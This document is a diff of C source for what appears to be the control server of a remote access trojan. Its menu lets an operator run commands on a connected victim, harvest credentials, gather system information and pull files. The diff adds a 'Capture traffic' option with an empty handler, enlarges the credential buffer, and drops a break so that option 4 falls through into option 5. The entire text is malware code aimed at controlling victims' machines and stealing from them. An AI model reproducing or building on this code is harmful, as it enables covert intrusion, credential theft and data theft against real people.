@@ -12,7 +12,7 @@
 #define PORT 8080
 #define MAXLINE 1024
 
-char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n";
+char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n";
 
 void exec_on_client(int clientfd)
 {   
@@ -33,24 +33,25 @@ void exec_on_client(int clientfd)
 
     write(STDOUT_FILENO,command_result,recv_len);
     write(STDOUT_FILENO,"\n",1);
-}
+}   
 
 void get_credentials(int clientfd)
 {
-    char info_creds[MAXLINE];
+    char info_creds[8192*10];
     int recv_len;
-    recv_len=recv(clientfd,info_creds,MAXLINE,0);
-
+    //recv_len=recvData(clientfd,info_creds);
+    recv_len=recvData(clientfd,info_creds);
     write(STDOUT_FILENO,info_creds,recv_len);
 }
 
 void get_system_info(int clientfd)
 {
-    {
                 char sys_info[MAXLINE * 10] = "";
                 char buffer[MAXLINE]; 
                 int total_bytes_read = 0;
-                int bytes_read;
+                int bytes_read; 
+
+                sys_info[0]=0;
 
                 while ((bytes_read = read(clientfd, buffer, sizeof(buffer) - 1)) > 0) 
                 {
@@ -77,7 +78,6 @@ void get_system_info(int clientfd)
                 {
                     myWrite("Failed to receive system information from client or connection closed.\n",STDOUT_FILENO);
                 }
-            }
 }
 
 void flushSTDIN()
@@ -86,7 +86,6 @@ void flushSTDIN()
     while((ch=getchar())!='\n' && ch!=EOF);
 }
 
-
 void retrieve_file(int clientfd)
 {
     struct file_struct file_to_retrieve;
@@ -94,7 +93,7 @@ void retrieve_file(int clientfd)
 
     memset(&file_to_retrieve,0,sizeof(struct file_struct));
 
-    read(STDIN_FILENO,file_to_retrieve.file_name,MAXLINE);
+    read(STDIN_FILENO,file_to_retrieve.file_name,100);
     file_to_retrieve.name_length=strlen(file_to_retrieve.file_name)-1;
     file_to_retrieve.file_size=0;
 
@@ -137,6 +136,11 @@ void retrieve_file(int clientfd)
      }
 
 }   
+
+void capturetraffic(int clientfd)
+{
+    
+}
 
 int main()
 {
@@ -186,7 +190,6 @@ int main()
     else
         printf("Server accepted client connection\n");
 
-    //FILE* stdout_file=fdopen(STDOUT_FILENO);
 
     while(1)
     {   
@@ -203,19 +206,25 @@ int main()
             case '1':
             write(connfd,"1",1);
             exec_on_client(connfd);
+            //flushSocketRead(connfd);
             break;
             case '2':
             write(connfd,"2",1);
             get_credentials(connfd);
+            //flushSocketRead(connfd);
             break;
             case '3':
             write(connfd, "3", 1);
             get_system_info(connfd);
+            //flushSocketRead(connfd);
             break;
             case '4':
             write(connfd,"4",1);
             retrieve_file(connfd);
-            
+            //flushSocketRead(connfd);
+            case '5':
+            write(connfd,"5",1);
+            break;
             default:
             break;
 
